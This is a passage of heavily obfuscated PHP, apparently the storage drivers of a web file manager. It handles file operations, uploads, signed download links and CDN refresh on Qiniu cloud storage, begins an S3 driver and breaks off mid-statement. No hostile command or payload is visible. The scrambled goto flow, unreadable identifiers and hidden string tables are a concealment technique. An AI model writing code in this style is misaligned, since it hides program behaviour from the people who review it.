$c®ì³†ï¿[] = $CëˆÛ†–ä¶[$EäßÅñÕæ[445]]; $E§“¥§¼ƒ–[] = $CëˆÛ†–ä¶[$EäßÅñÕæ[392]]; } } goto c¤’ƒ×Ú½Ï; báÆ®ÛèÑ¯: } public function userSpace() { $Fìˆåî–­ =& $_SERVER[¬ı§†‰ú˜¼]; $dÀ‹‹Áøëó = $this->tablePrefix; $A‹Ã¾¤£³Å = array($Fìˆåî–­[1519] => USER_ID); $F¬å‰Í‰¶¬ = "{$dÀ‹‹Áøëó}\151\157\x5f\x66\151\x6c\x65\40\146\151\x6c\145\x73\x20\157\156\40\x66\151\154\145\163\56\146\151\x6c\x65\x49\x44\x20\75\x20\x68\151\163\x74\x6f\x72\x79\56\146\x69\154\145\x49\x44"; return $this->alias($Fìˆåî–­[1927])->where($A‹Ã¾¤£³Å)->join($F¬å‰Í‰¶¬, $Fìˆåî–­[1928])->sum($Fìˆåî–­[78]); } } goto eä‡È¶Š¥; cØôÔ§±Ÿ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($FÊ°·ŞÏìœ) { parent::__construct(); require_once SDK_DIR . $_SERVER[¬ı§†‰ú˜¼][1300]; $this->_init($FÊ°·ŞÏìœ); } public function _init($Dù‚ñºŒ¶´) { goto AÕ·©Ò’é¥; B«˜ÄŒ£‡: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto dÁ„Ùò·Ï¥; Cí¾‚Šùô: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto B«˜ÄŒ£‡; AÕ·©Ò’é¥: $aªíµŠ×Èö =& $_SERVER[¬ı§†‰ú˜¼]; foreach ($Dù‚ñºŒ¶´ as $eÑËÔ·Ï‹ => $b¿ÂáÉÅº–) { if (isset($this->{$eÑËÔ·Ï‹})) { $this->{$eÑËÔ·Ï‹} = $b¿ÂáÉÅº–; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($aªíµŠ×Èö[1301] . LNG($aªíµŠ×Èö[1260])); } goto Cí¾‚Šùô; dÁ„Ùò·Ï¥: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($B¦ù¿ ö…Ç, $FÔÊº¦¬Ì— = '', $A¦Ÿ³©öŠ° = REPEAT_RENAME) { if ($this->setContent($B¦ù¿ ö…Ç, $FÔÊº¦¬Ì—)) { return $this->getPathOuter($B¦ù¿ ö…Ç); } return !1; } public function mkdir($bªµÖø·™ä, $D×ö‰ÂÏ¹‡ = REPEAT_SKIP) { goto aÁ‚¿¬©æ­; dªœâ‘×¡«: $bªµÖø·™ä = $eåÅÁÑ÷† . $CÀ¯®È‰Ç¨[8]; $dÈ¿”Ù¡´ = get_path_this($eåÅÁÑ÷†); $C›õ—¢î¸ = $bªµÖø·™ä . $dÈ¿”Ù¡´; goto F‘ÏÜÎæ’è; F‘ÏÜÎæ’è: if (!$this->mkfile($C›õ—¢î¸)) { return !1; } if (!$this->moveFile($C›õ—¢î¸, $bªµÖø·™ä)) { $this->delFile($C›õ—¢î¸); return !1; } return $this->getPathOuter($eåÅÁÑ÷†); goto dÚ§Ïæ®ôØ; aÁ‚¿¬©æ­: $CÀ¯®È‰Ç¨ =& $_SERVER[¬ı§†‰ú˜¼]; $eåÅÁÑ÷† = trim($bªµÖø·™ä, $CÀ¯®È‰Ç¨[8]); if ($this->_isFolder($eåÅÁÑ÷†)) { return $this->getPathOuter($eåÅÁÑ÷†); } goto dªœâ‘×¡«; dÚ§Ïæ®ôØ: } public function copyFile($DèîÏ“Ãœ°, $Fš¾œê‹É) { $DìŠ˜á–Âğ = $this->bucketManager->copy($this->bucket, $DèîÏ“Ãœ°, $this->bucket, $Fš¾œê‹É, !0); return $DìŠ˜á–Âğ ? !1 : $this->getPathOuter($Fš¾œê‹É); } public function moveFile($fëéŞƒâ¡–, $cÎ·»İ“¿…) { $C•ñ¬¥»º¡ = $this->bucketManager->move($this->bucket, $fëéŞƒâ¡–, $this->bucket, $cÎ·»İ“¿…, !0); return $C•ñ¬¥»º¡ ? !1 : $this->getPathOuter($cÎ·»İ“¿…); } public function delFile($dÜæ¨ŸäÜç) { if (!$this->exist($dÜæ¨ŸäÜç)) { return !0; } $C—ÅÌ“Ù„¡ = $this->bucketManager->delete($this->bucket, $dÜæ¨ŸäÜç); return $C—ÅÌ“Ù„¡ ? !1 : !0; } public function delFolder($c½¤¯ĞïàÜ) { goto DÈğéõ§‘; fÎˆƒˆ†ô´: return $this->delByBatch($A¢Â¯À˜Ìš[$eÜŠ‰…×•ä[75]]); goto b«¤»”¼â; DÈğéõ§‘: $eÜŠ‰…×•ä =& $_SERVER[¬ı§†‰ú˜¼]; if (!$this->exist($c½¤¯ĞïàÜ)) { return !0; } $this->listItemCache = !1; goto CŠÛÁñ›»; CŠÛÁñ›»: $A¢Â¯À˜Ìš = $this->fileList($c½¤¯ĞïàÜ); $this->listItemCache = !0; $fîÙÒô’•£ = trim($c½¤¯ĞïàÜ, $eÜŠ‰…×•ä[8]) . $eÜŠ‰…×•ä[8]; goto FŒƒ£êƒÏ­; FŒƒ£êƒÏ­: if (!empty($c½¤¯ĞïàÜ) && !in_array($fîÙÒô’•£, $A¢Â¯À˜Ìš[$eÜŠ‰…×•ä[75]])) { $A¢Â¯À˜Ìš[$eÜŠ‰…×•ä[75]][] = $fîÙÒô’•£; } $DŠã–ÓÅÙ = $this->delByBatch($A¢Â¯À˜Ìš[$eÜŠ‰…×•ä[74]]); if (!$DŠã–ÓÅÙ) { return !1; } goto fÎˆƒˆ†ô´; b«¤»”¼â: } private function delByBatch($e§œ…‚ÛÈƒ) { foreach (array_chunk($e§œ…‚ÛÈƒ, 1000) as $BØ›ÃÓïÎ) { $CÍ¦ç–¦Ê = $this->bucketManager->buildBatchDelete($this->bucket, $BØ›ÃÓïÎ); list($fàëô„¹ñ, $E£‰®ÛÔÄ‰) = $this->bucketManager->batch($CÍ¦ç–¦Ê); if ($E£‰®ÛÔÄ‰) { return !1; } } return !0; } public function rename($f–®¼¬Ñàƒ, $a­ ÈÒáÃ¤) { return $this->renameObject($f–®¼¬Ñàƒ, $a­ ÈÒáÃ¤); } public function fileInfo($aƒìÉ¾Ø¾, $bæƒ„˜ª“• = false, $aÀ…¬ÂÃ‘ = array()) { goto C‘·ÈŞ“†Ô; C‘·ÈŞ“†Ô: $e®Ë‰–ƒ±ï =& $_SERVER[¬ı§†‰ú˜¼]; $F–°À‚âŸ÷ = array($e®Ë‰–ƒ±ï[28] => $this->pathThis($aƒìÉ¾Ø¾), $e®Ë‰–ƒ±ï[76] => $this->getPathOuter($e®Ë‰–ƒ±ï[8] . $aƒìÉ¾Ø¾), $e®Ë‰–ƒ±ï[29] => $e®Ë‰–ƒ±ï[192], $e®Ë‰–ƒ±ï[78] => isset($aÀ…¬ÂÃ‘[$e®Ë‰–ƒ±ï[1302]]) ? $aÀ…¬ÂÃ‘[$e®Ë‰–ƒ±ï[1302]] : 0, $e®Ë‰–ƒ±ï[168] => $this->ext($aƒìÉ¾Ø¾)); if ($bæƒ„˜ª“•) { return $F–°À‚âŸ÷; } goto c¬Ëš †ª; c¬Ëš †ª: $F–°À‚âŸ÷[$e®Ë‰–ƒ±ï[193]] = $F–°À‚âŸ÷[$e®Ë‰–ƒ±ï[84]] = 0; $F–°À‚âŸ÷[$e®Ë‰–ƒ±ï[194]] = $F–°À‚âŸ÷[$e®Ë‰–ƒ±ï[195]] = !0; if (empty($aÀ…¬ÂÃ‘)) { $aÀ…¬ÂÃ‘ = $this->objectMeta($aƒìÉ¾Ø¾); if (!$aÀ…¬ÂÃ‘) { return $F–°À‚âŸ÷; } } goto Bš¬âó¥ÄÃ; Bš¬âó¥ÄÃ: if (isset($aÀ…¬ÂÃ‘[$e®Ë‰–ƒ±ï[1303]])) { $F–°À‚âŸ÷[$e®Ë‰–ƒ±ï[84]] = substr($aÀ…¬ÂÃ‘[$e®Ë‰–ƒ±ï[1303]] . $e®Ë‰–ƒ±ï[33], 0, 10); } if (isset($aÀ…¬ÂÃ‘[$e®Ë‰–ƒ±ï[1302]])) { $F–°À‚âŸ÷[$e®Ë‰–ƒ±ï[78]] = $aÀ…¬ÂÃ‘[$e®Ë‰–ƒ±ï[1302]]; } return $F–°À‚âŸ÷; goto fÑÙÄ®¿©¼; fÑÙÄ®¿©¼: } public function folderInfo($FŞ·ìÂë‹, $D¸«ä êŠ‹ = false) { goto DÄ÷í°åœ; eÒ†ÜÀÙ–à: $E„¾Ğ÷‹Ú— = $this->objectMeta($FŞ·ìÂë‹); if (isset($E„¾Ğ÷‹Ú—[$EœšéÁ†ƒ[1303]])) { $b¿‚àßĞëõ[$EœšéÁ†ƒ[84]] = substr($E„¾Ğ÷‹Ú—[$EœšéÁ†ƒ[1303]] . $EœšéÁ†ƒ[33], 0, 10); } return $b¿‚àßĞëõ; goto E¢Âª„Ü„; B÷‰‰å–íß: $b¿‚àßĞëõ[$EœšéÁ†ƒ[193]] = $b¿‚àßĞëõ[$EœšéÁ†ƒ[84]] = 0; $b¿‚àßĞëõ[$EœšéÁ†ƒ[194]] = $b¿‚àßĞëõ[$EœšéÁ†ƒ[195]] = !0; $FŞ·ìÂë‹ = rtrim($FŞ·ìÂë‹, $EœšéÁ†ƒ[8]) . $EœšéÁ†ƒ[8]; goto eÒ†ÜÀÙ–à; DÄ÷í°åœ: $EœšéÁ†ƒ =& $_SERVER[¬ı§†‰ú˜¼]; $b¿‚àßĞëõ = array($EœšéÁ†ƒ[28] => $this->pathThis($FŞ·ìÂë‹), $EœšéÁ†ƒ[76] => $this->getPathOuter($EœšéÁ†ƒ[8] . $FŞ·ìÂë‹), $EœšéÁ†ƒ[29] => $EœšéÁ†ƒ[77]); if ($D¸«ä êŠ‹) { return $b¿‚àßĞëõ; } goto B÷‰‰å–íß; E¢Âª„Ü„: } public function listPath($AĞ‹™èšğ‚, $bä†Î•¨µ = false) { $aÕŠùß²Õ„ =& $_SERVER[¬ı§†‰ú˜¼]; $dÄÅÂ˜¯à = $this->fileList($AĞ‹™èšğ‚, $aÕŠùß²Õ„[8], !0); foreach ($dÄÅÂ˜¯à[$aÕŠùß²Õ„[75]] as $fò’ÇêğÅÕ => $dœÙáŠˆÉ¤) { $dÄÅÂ˜¯à[$aÕŠùß²Õ„[75]][$fò’ÇêğÅÕ] = $this->folderInfo($dœÙáŠˆÉ¤, $bä†Î•¨µ); } foreach ($dÄÅÂ˜¯à[$aÕŠùß²Õ„[74]] as $fò’ÇêğÅÕ => $dœÙáŠˆÉ¤) { $dÄÅÂ˜¯à[$aÕŠùß²Õ„[74]][$fò’ÇêğÅÕ] = $this->fileInfo($dœÙáŠˆÉ¤[$aÕŠùß²Õ„[93]], $bä†Î•¨µ, $dœÙáŠˆÉ¤); } return $dÄÅÂ˜¯à; } public function has($aË·éêìÁè, $CÇöÉƒŒğ‘ = false, $båÅ™…à…Š = true) { goto FßªùÑ‡¡; FßªùÑ‡¡: $eá‘¬ÁÄä =& $_SERVER[¬ı§†‰ú˜¼]; $aË·éêìÁè = trim($aË·éêìÁè, $eá‘¬ÁÄä[8]); $B§«©¥ù–ë = empty($aË·éêìÁè) ? $eá‘¬ÁÄä[33] : $aË·éêìÁè . $eá‘¬ÁÄä[8]; goto Có†ÌÉ¹º; eÜ³Â™¨„×: $aœƒ‹·¸«Æ = $B­¶•óÈæ = 0; while (!0) { check_abort(); list($FÀ´ÓĞ”‡ì, $D¸Ùæòè Ü) = $this->bucketManager->listFiles($this->bucket, $B§«©¥ù–ë, $Dİ¨”Ì¥È‡, $BÚĞÜ³‰‡, $B’ˆ¦¿Ù); if ($D¸Ùæòè Ü) { break; } $Dİ¨”Ì¥È‡ = array_key_exists($eá‘¬ÁÄä[1272], $FÀ´ÓĞ”‡ì) ? $Dİ¨”Ì¥È‡ = $FÀ´ÓĞ”‡ì[$eá‘¬ÁÄä[1304]] : $eá‘¬ÁÄä[33]; if ($CÇöÉƒŒğ‘) { if (!empty($FÀ´ÓĞ”‡ì[$eá‘¬ÁÄä[1305]])) { $aœƒ‹·¸«Æ += count($FÀ´ÓĞ”‡ì[$eá‘¬ÁÄä[1305]]); } if (!empty($FÀ´ÓĞ”‡ì[$eá‘¬ÁÄä[1306]])) { $B­¶•óÈæ += count($FÀ´ÓĞ”‡ì[$eá‘¬ÁÄä[1306]]); } if ($Dİ¨”Ì¥È‡ === $eá‘¬ÁÄä[33]) { break; } continue; } if ($båÅ™…à…Š) { if (!empty($FÀ´ÓĞ”‡ì[$eá‘¬ÁÄä[1305]])) { return !0; } } else { if (!empty($FÀ´ÓĞ”‡ì[$eá‘¬ÁÄä[1306]])) { return !0; } } if ($Dİ¨”Ì¥È‡ === $eá‘¬ÁÄä[33]) { break; } } if ($CÇöÉƒŒğ‘) { return array($eá‘¬ÁÄä[202] => $aœƒ‹·¸«Æ, $eá‘¬ÁÄä[203] => $B­¶•óÈæ); } goto AÇ»Ë†‘Öó; AÇ»Ë†‘Öó: return !1; goto aïŠÙÅÜ³İ; Có†ÌÉ¹º: $Dİ¨”Ì¥È‡ = $eá‘¬ÁÄä[33]; $BÚĞÜ³‰‡ = 500; $B’ˆ¦¿Ù = $eá‘¬ÁÄä[8]; goto eÜ³Â™¨„×; aïŠÙÅÜ³İ: } public function listAll($F³£öÃ®“‹) { $CÉ·¨á­£ä =& $_SERVER[¬ı§†‰ú˜¼]; $C•ŠŒ¢„´ = $this->fileList($F³£öÃ®“‹, $CÉ·¨á­£ä[33], !0); $B’íÃ‡§‚— = array(); foreach ($C•ŠŒ¢„´[$CÉ·¨á­£ä[74]] as $eªÔÛğŒ¬Ğ) { $B’íÃ‡§‚—[$eªÔÛğŒ¬Ğ[$CÉ·¨á­£ä[93]]] = $eªÔÛğŒ¬Ğ[$CÉ·¨á­£ä[78]]; } foreach ($C•ŠŒ¢„´[$CÉ·¨á­£ä[75]] as $eªÔÛğŒ¬Ğ) { if (is_string($eªÔÛğŒ¬Ğ)) { $B’íÃ‡§‚—[$eªÔÛğŒ¬Ğ] = 0; } } return $this->listAllFiles($F³£öÃ®“‹, array_keys($B’íÃ‡§‚—), $B’íÃ‡§‚—); } private function fileList($c²Üª‹Ä, $d”¹–²áÏë = '', $FÔ¥ŸÕÜù = 0) { goto a©ù¬«„ŒŠ; A¾ò˜Ô¤ù·: return array($c´†Í‡ò‰­[75] => $Fõó„ŞĞÍ, $c´†Í‡ò‰­[74] => $AÄ¬¬Öƒ); goto C¨°¦…›šƒ; D³í²‡ïœ¾: $Fõó„ŞĞÍ = $AÄ¬¬Öƒ = array(); while (!0) { check_abort(); list($E„‡ˆ÷¹õÔ, $a°½œÉÂõø) = $this->bucketManager->listFiles($this->bucket, $dæ‹¬ÚÑåß, $FßÅ”®Ú–, $E­Ÿ©ğÜ¤, $d”¹–²áÏë); if ($a°½œÉÂõø) { break; } $FßÅ”®Ú– = array_key_exists($c´†Í‡ò‰­[1272], $E„‡ˆ÷¹õÔ) ? $FßÅ”®Ú– = $E„‡ˆ÷¹õÔ[$c´†Í‡ò‰­[1304]] : $c´†Í‡ò‰­[33]; $BùŞ–áÖŞ = isset($E„‡ˆ÷¹õÔ[$c´†Í‡ò‰­[1305]]) ? $E„‡ˆ÷¹õÔ[$c´†Í‡ò‰­[1305]] : array(); $A°­‡Š‡…Ó = isset($E„‡ˆ÷¹õÔ[$c´†Í‡ò‰­[1306]]) ? $E„‡ˆ÷¹õÔ[$c´†Í‡ò‰­[1306]] : array(); foreach ($BùŞ–áÖŞ as $EÓÁ¶ÂÔÔÇ) { goto eÃÍòÅ¾ª; FÅ ÉÜ´÷: $EÓÁ¶ÂÔÔÇ[$c´†Í‡ò‰­[78]] = $cİ‰­¥îö; $dæ„µòÎ—ñ = $cİ‰­¥îö == 0 && substr($E¥”¨ª¦£‚, strlen($E¥”¨ª¦£‚) - 1, 1) == $c´†Í‡ò‰­[8] ? !0 : !1; if ($eØ‘Æ‡í¸ñ) { $this->cacheMethod($c´†Í‡ò‰­[198], $E¥”¨ª¦£‚, $dæ„µòÎ—ñ); $this->cacheMethod($c´†Í‡ò‰­[199], $E¥”¨ª¦£‚, $EÓÁ¶ÂÔÔÇ); } goto fÚÄ…×ˆ Å; eÃÍòÅ¾ª: if ($EÓÁ¶ÂÔÔÇ[$c´†Í‡ò‰­[93]] == $dæ‹¬ÚÑåß) { continue; } $E¥”¨ª¦£‚ = $EÓÁ¶ÂÔÔÇ[$c´†Í‡ò‰­[93]]; $cİ‰­¥îö = $EÓÁ¶ÂÔÔÇ[$c´†Í‡ò‰­[1302]]; goto FÅ ÉÜ´÷; fÚÄ…×ˆ Å: if ($dæ„µòÎ—ñ) { $Fõó„ŞĞÍ[] = $E¥”¨ª¦£‚; continue; } $AÄ¬¬Öƒ[] = $FÔ¥ŸÕÜù ? $EÓÁ¶ÂÔÔÇ : $E¥”¨ª¦£‚; goto d­…»ÀÛÔ”; d­…»ÀÛÔ”: } foreach ($A°­‡Š‡…Ó as $E¥”¨ª¦£‚) { if ($E¥”¨ª¦£‚ == $dæ‹¬ÚÑåß) { continue; } $Fõó„ŞĞÍ[] = $E¥”¨ª¦£‚; if ($eØ‘Æ‡í¸ñ) { $this->cacheMethod($c´†Í‡ò‰­[198], $E¥”¨ª¦£‚, !0); } } if ($FßÅ”®Ú– === $c´†Í‡ò‰­[33]) { break; } } if ($eØ‘Æ‡í¸ñ) { $this->cacheMethod($c´†Í‡ò‰­[198], $c²Üª‹Ä, !0); } goto A¾ò˜Ô¤ù·; a©ù¬«„ŒŠ: $c´†Í‡ò‰­ =& $_SERVER[¬ı§†‰ú˜¼]; $c²Üª‹Ä = trim($c²Üª‹Ä, $c´†Í‡ò‰­[8]); $dæ‹¬ÚÑåß = empty($c²Üª‹Ä) ? $c´†Í‡ò‰­[33] : $c²Üª‹Ä . $c´†Í‡ò‰­[8]; goto b¦ß‹¸é¿; b¦ß‹¸é¿: $FßÅ”®Ú– = $c´†Í‡ò‰­[33]; $E­Ÿ©ğÜ¤ = 1000; $eØ‘Æ‡í¸ñ = $this->listItemCache === !1 ? !1 : !0; goto D³í²‡ïœ¾; C¨°¦…›šƒ: } public function canRead($d®‘ã¡ƒ) { return $this->exist($d®‘ã¡ƒ) ? !0 : !1; } public function canWrite($bŒ½™ªÇÚ) { return $this->exist($bŒ½™ªÇÚ) ? !0 : !1; } public function getContent($bç¼ˆ¡éò§) { return $this->fileSubstr($bç¼ˆ¡éò§, 0, -1); } public function setContent($FæòÑØ¨Ğö, $D³ˆÔ×Òö = '') { $d÷æ÷…ë·Í = $this->tempFile($this->pathThis($FæòÑØ¨Ğö)); file_put_contents($d÷æ÷…ë·Í, $D³ˆÔ×Òö); if ($this->upload($FæòÑØ¨Ğö, $d÷æ÷…ë·Í)) { $this->tempFileRemve($d÷æ÷…ë·Í); return !0; } return !1; } public function refreshUrls($Bì³ó¼•¤) { goto DÖÓ¯–±éê; d¹øğ¢·–¶: return $f¢ĞÙã‘‹‹[$BšÊ”£ò¶[1077]] == $BšÊ”£ò¶[721] ? !0 : !1; goto cÂàÇ‚Ë; DÖÓ¯–±éê: $BšÊ”£ò¶ =& $_SERVER[¬ı§†‰ú˜¼]; $f§Ê¿ì…Ä’ = array(); if (is_array($Bì³ó¼•¤)) { foreach ($Bì³ó¼•¤ as $aÏÁ‘øˆ“) { $f§Ê¿ì…Ä’[] = $this->link($aÏÁ‘øˆ“); } } else { $f§Ê¿ì…Ä’[] = $this->link($Bì³ó¼•¤); } goto C…ìŒõ¥ôô; C…ìŒõ¥ôô: $C‘Ê¬ÂÅíô = new Qiniu\Cdn\CdnManager($this->auth); list($f¢ĞÙã‘‹‹, $FàÊ¶Â®§) = $C‘Ê¬ÂÅíô->refreshUrls($f§Ê¿ì…Ä’); if ($FàÊ¶Â®§) { return !1; } goto d¹øğ¢·–¶; cÂàÇ‚Ë: } public function fileSubstr($Fè¹¬‡È˜, $d”î³©¹–Ï, $A£ğ±Í¦ğç) { $FØÏŸ¯Ïš¦ =& $_SERVER[¬ı§†‰ú˜¼]; if (!($C¡°‡„ğ = $this->link($Fè¹¬‡È˜))) { return !1; } $d¾Ğ‹±„±ˆ = !1; if ($A£ğ±Í¦ğç > 0) { $d”ÊÓâ‰•¯ = $d”î³©¹–Ï + $A£ğ±Í¦ğç - 1; $d¾Ğ‹±„±ˆ = array($FØÏŸ¯Ïš¦[1307] . $d”î³©¹–Ï . $FØÏŸ¯Ïš¦[438] . $d”ÊÓâ‰•¯); } $b¶®¯óÜ„ = url_request($C¡°‡„ğ, $FØÏŸ¯Ïš¦[227], !1, $d¾Ğ‹±„±ˆ); return $b¶®¯óÜ„[$FØÏŸ¯Ïš¦[714]] ? $b¶®¯óÜ„[$FØÏŸ¯Ïš¦[1087]] : !1; } public function upload($E†ø¼¬­•ã, $E¦ö¹¼»³Œ, $fê§òÆËÓ = false, $a ¯‡–§ = REPEAT_REPLACE) { $aá”í‹£âÀ = new Qiniu\Storage\UploadManager(); $bìÆ± ì = $this->auth->uploadToken($this->bucket, $E†ø¼¬­•ã); $dÂÕÓ‚¶ŠÁ = get_file_mime(get_path_ext($E¦ö¹¼»³Œ)); list($c¿è¨¨æ, $e®Ñ¢òÛ¶£) = $aá”í‹£âÀ->putFile($bìÆ± ì, $E†ø¼¬­•ã, $E¦ö¹¼»³Œ, null, $dÂÕÓ‚¶ŠÁ); return $e®Ñ¢òÛ¶£ ? !1 : $this->getPathOuter($E†ø¼¬­•ã); } public function uploadFormData($cƒÏö…ÜÑ, $Cï¦§Ã« = 3600) { return $this->uploadToken($cƒÏö…ÜÑ, $Cï¦§Ã«); } public function multiUploadFormData($Eƒä´¿…¸Ã, $EÁè­´Å® = 3600) { return $this->uploadToken($Eƒä´¿…¸Ã, $EÁè­´Å®); } private function uploadToken($f™ÆÚ£Üœ, $Fë•Õ¦¨­Ô = 3600) { goto cËÁ”¹Ä¥·; cËÁ”¹Ä¥·: $f¬Ë Ş…‘š =& $_SERVER[¬ı§†‰ú˜¼]; $c±ìƒ™¦–Æ = $Fë•Õ¦¨­Ô; $DĞù¦ÚË‡§ = array($f¬Ë Ş…‘š[1308] => $f¬Ë Ş…‘š[1309]); goto D´ÖİŸ™‚–; fÈª¤•†‡¤: $b¿¾˜®æÀ‡ = http_type() . "\x3a\x2f\x2f\165\160\x6c\x6f\x61\x64{$f÷à©Œì†}\x2e\161\x69\x6e\x69\x75\x70\56\143\x6f\155\57"; return array($f¬Ë Ş…‘š[1311] => $b¼Õ”ß‚ñİ, $f¬Ë Ş…‘š[1312] => $b¿¾˜®æÀ‡); goto c¯°ß¢¡Îé; D´ÖİŸ™‚–: $F¢³å®Üí¿ = $f™ÆÚ£Üœ; $b¼Õ”ß‚ñİ = $this->auth->uploadToken($this->bucket, $F¢³å®Üí¿, $c±ìƒ™¦–Æ, $DĞù¦ÚË‡§, !0); $f÷à©Œì† = empty($this->region) || $this->region == $f¬Ë Ş…‘š[1310] ? $f¬Ë Ş…‘š[33] : $f¬Ë Ş…‘š[438] . $this->region; goto fÈª¤•†‡¤; c¯°ß¢¡Îé: } public function download($FöìØÅì¬ó, $e´®¨‡£ãÌ) { goto F­“áÊå÷; C£ì·êéî¯: $DÊ–ˆåŞ‹Ô = 1024 * 200; $fî£ºğõ­« = fopen($A„Ï‰ù½, $_SERVER[¬ı§†‰ú˜¼][1313]); while (!0) { $bøİ®“„ = $this->fileSubstr($FöìØÅì¬ó, $CÑ¦“¾É£, $DÊ–ˆåŞ‹Ô); if ($bøİ®“„ === !1) { return !1; } fwrite($fî£ºğõ­«, $bøİ®“„); $CÑ¦“¾É£ += $DÊ–ˆåŞ‹Ô; if (strlen($bøİ®“„) < $DÊ–ˆåŞ‹Ô) { break; } } goto AÁ¿Æ±ƒË¤; F­“áÊå÷: $A„Ï‰ù½ = IO::getPathInner(IO::mkfile($e´®¨‡£ãÌ)); if (!($DÕà²çˆ² = $this->link($FöìØÅì¬ó))) { return !1; } $CÑ¦“¾É£ = 0; goto C£ì·êéî¯; AÁ¿Æ±ƒË¤: fclose($fî£ºğõ­«); return $e´®¨‡£ãÌ; goto fˆé©ÄŸâœ; fˆé©ÄŸâœ: } public function link($fÚÔŸÍÔÂÎ, $eº«®ËÉ“¯ = '') { if (!$this->isFile($fÚÔŸÍÔÂÎ)) { return !1; } $c¹¢Á”¥– = $this->getHost() . $_SERVER[¬ı§†‰ú˜¼][8] . $this->pathEncode($fÚÔŸÍÔÂÎ) . $eº«®ËÉ“¯; return $this->auth->privateDownloadUrl($c¹¢Á”¥–, 3600 * 12); } public function fileOut($A½ÎˆÃÏ, $FÚ¤ ‘’‘ = false, $bæŠ§Ø¦î = false, $C…É¨Ü˜İæ = '') { $EŒëîŸ³ã =& $_SERVER[¬ı§†‰ú˜¼]; if ($this->isFileOutServer()) { return $this->fileOutServer($A½ÎˆÃÏ, $FÚ¤ ‘’‘, $bæŠ§Ø¦î, $C…É¨Ü˜İæ); } if (!$bæŠ§Ø¦î) { $bæŠ§Ø¦î = $this->pathThis($A½ÎˆÃÏ); } $cÙ¾Ú—‰Êç = $FÚ¤ ‘’‘ ? $EŒëîŸ³ã[1314] . rawurlencode($bæŠ§Ø¦î) : $EŒëîŸ³ã[33]; $cœëÓö ¿ = $this->link($A½ÎˆÃÏ, $cÙ¾Ú—‰Êç); $this->fileOutLink($cœëÓö ¿); } public function fileOutServer($F’Ì‡Âë, $aªÉ…ïƒ = false, $aò®¡éÛ» = false, $fõ’ÅÓ†ï¾ = '') { parent::fileOut($F’Ì‡Âë, $aªÉ…ïƒ, $aò®¡éÛ», $fõ’ÅÓ†ï¾); } public function fileOutImage($D‹•¢İõ‹Ô, $F–ƒÖÍ¼ª = 250) { $A²Ç…±ª¿ = $this->link($D‹•¢İõ‹Ô, $_SERVER[¬ı§†‰ú˜¼][1315] . $F–ƒÖÍ¼ª); $this->fileOutLink($A²Ç…±ª¿); } public function fileOutImageServer($e©£‰¸ÔØ, $b‡ª–è¸éã = 250) { parent::fileOutImage($e©£‰¸ÔØ, $b‡ª–è¸éã); } public function hashMd5($DâêÖ¸ƒ´¥) { $CÜÊø£Âß =& $_SERVER[¬ı§†‰ú˜¼]; $FºÑ¡óš‰ = $this->objectMeta($DâêÖ¸ƒ´¥); return isset($FºÑ¡óš‰[$CÜÊø£Âß[207]]) ? $FºÑ¡óš‰[$CÜÊø£Âß[207]] : !1; $d‡Ş‘Ç¡ˆà = $this->link($DâêÖ¸ƒ´¥, $CÜÊø£Âß[1316]); } public function size($dÆÓÛÓ¸‚…) { $fÜ¦‹©ˆ… = $this->objectMeta($dÆÓÛÓ¸‚…); return $fÜ¦‹©ˆ… ? $fÜ¦‹©ˆ…[$_SERVER[¬ı§†‰ú˜¼][78]] : 0; } public function info($BòµœÑòº) { if ($this->isFolder($BòµœÑòº)) { return $this->folderInfo($BòµœÑòº); } else { if ($this->isFile($BòµœÑòº)) { return $this->fileInfo($BòµœÑòº); } } return !1; } public function exist($dÄá»Â‹¾) { return $this->isFile($dÄá»Â‹¾) || $this->isFolder($dÄá»Â‹¾); } public function isFile($dÅàœ‰‹í) { return !$this->isFolder($dÅàœ‰‹í) && $this->objectMeta($dÅàœ‰‹í); } public function isFolder($aÔ‰Ù”ª½) { return $this->cacheMethod($_SERVER[¬ı§†‰ú˜¼][198], $aÔ‰Ù”ª½); } protected function objectMeta($DŒ»•©¼Åê) { return $this->cacheMethod($_SERVER[¬ı§†‰ú˜¼][199], $DŒ»•©¼Åê); } protected function _objectMeta($E„‰‹¡‹¦) { $Dâ»æç¬ò¯ =& $_SERVER[¬ı§†‰ú˜¼]; list($cËëëµŠ¹, $a•óÎ½¨Ñ©) = $this->bucketManager->stat($this->bucket, $E„‰‹¡‹¦); if ($cËëëµŠ¹) { $cËëëµŠ¹[$Dâ»æç¬ò¯[78]] = intval($cËëëµŠ¹[$Dâ»æç¬ò¯[1302]]); } return $cËëëµŠ¹; } protected function _isFolder($B£Ÿ–‹‚Ê) { $DíÌ„÷ƒã® =& $_SERVER[¬ı§†‰ú˜¼]; if ($B£Ÿ–‹‚Ê == $DíÌ„÷ƒã®[33] || $B£Ÿ–‹‚Ê == $DíÌ„÷ƒã®[8]) { return !0; } list($b¦ÕÁÎà•¬, $F‘ğè¢¤Âí) = $this->bucketManager->listFiles($this->bucket, trim($B£Ÿ–‹‚Ê, $DíÌ„÷ƒã®[8]) . $DíÌ„÷ƒã®[8], $DíÌ„÷ƒã®[33], 1, $DíÌ„÷ƒã®[8]); return !empty($b¦ÕÁÎà•¬[$DíÌ„÷ƒã®[1305]]) || !empty($b¦ÕÁÎà•¬[$DíÌ„÷ƒã®[1306]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($fáÈ„¡±ùÂ) { parent::__construct($fáÈ„¡±ùÂ); } public function uploadFormData($aë±å¼«å, $e¬Ò…²Í‹– = 3600) { goto cÔù˜’©Ù; Eâî‡Ş¹¦™: $dìÇË®¢ô† = array($this->accessKey, $eï†ŞêÑÀ¼, $this->region, $eÉîˆØïå, $eÂ¥±œâàÀ); $e…Æƒßøô = implode($a•“¥«‰¦´[8], $dìÇË®¢ô†); $b‘™ØáÇƒ‡ = array($a•“¥«‰¦´[1189] => gmdate($a•“¥«‰¦´[1188], strtotime($a•“¥«‰¦´[1225])), $a•“¥«‰¦´[1190] => array(array($a•“¥«‰¦´[1192] 